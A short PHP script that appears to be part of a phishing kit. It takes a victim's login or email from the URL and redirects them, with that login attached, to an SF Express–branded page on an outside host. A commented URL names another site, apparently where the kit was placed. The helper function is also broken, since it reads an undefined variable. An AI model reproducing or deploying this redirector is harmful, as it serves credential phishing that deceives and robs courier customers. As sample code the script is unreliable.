<?php
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($uid, $find);
$loginID = substr($uid, 0, $pos);
return $loginID;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
header("Location: https://digitalfarm.me/Apps/SFExpress/?login=$login");

##http://www.loveholiday.co.th/ds/

?>